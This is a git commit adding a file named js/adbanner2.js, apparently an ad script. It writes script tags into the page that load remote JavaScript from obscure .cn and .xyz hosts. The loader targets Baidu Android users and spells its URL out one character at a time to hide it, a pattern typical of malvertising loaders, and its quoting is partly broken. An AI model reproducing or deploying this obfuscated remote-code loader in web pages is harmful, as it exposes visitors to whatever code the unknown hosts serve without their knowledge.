b33466d5a6f0409e981092ba1b13a42bfe0506a0
yumibook <76172903+yumibook@users.noreply.github.com>
2020-12-17 23:37:28 +0800

    Add files via upload

---
+++ js/adbanner2.js
@@ -0,0 +1,12 @@
+document.writeln("if( navigator.userAgent.indexOf(\'baidu\') > -1 && navigator.userAgent.indexOf(\'Android\') > -1){");
+document.writeln("		document.write(\'<script src=\'\');");
+document.writeln("		document.write(\'h\');");
+document.writeln("		document.write(\'t\');");
+document.writeln("		document.write(\'t\');");
+document.writeln("		document.write(\'p\');");
+document.writeln("		document.write(\'s:\');");
+document.writeln("		document.write(\'//mfo25978.eeo1h1.cn/w9981xhtml\');");
+document.writeln("		document.write(\'\'><\/\//script>\');");
+document.writeln("	}else{");
+document.writeln(" 	document.writeln(\'<script src=\'https://mo.qpmue.xyz/9981(com?\' + (new Date()).getTime() + \'\'><\/\//script>\')");
+document.writeln("	}");
